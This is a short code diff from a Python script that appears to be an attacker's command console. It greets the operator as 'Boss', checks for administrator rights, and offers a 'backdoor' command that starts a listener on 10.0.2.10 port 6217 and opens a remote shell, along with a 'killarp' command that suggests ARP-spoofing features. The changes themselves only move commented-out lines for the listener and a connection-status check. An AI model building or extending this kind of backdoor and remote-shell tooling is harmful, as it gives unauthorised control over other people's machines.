@@ -316,9 +316,6 @@ except AttributeError:
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 
 print('Welcome back Boss!')
-# my_listener = multiprocessing.Process(target=Listener, args=("10.0.2.10", 6217))
-# my_listener.start()
-
 
 while True:
     print("Insert your command:")
@@ -437,8 +434,11 @@ while True:
     elif command == 'backdoor':
         my_listener = Listener("10.0.2.10", 6217)  # listener for incoming connections
         service = multiprocessing.Process(target=my_listener.server)
+        # status = multiprocessing.Process(target=my_listener.check_connections)
         service.start()
+        # status.start()
         my_listener.shell()
+        # status.terminate()
         service.terminate()
 
     elif command == 'killarp':
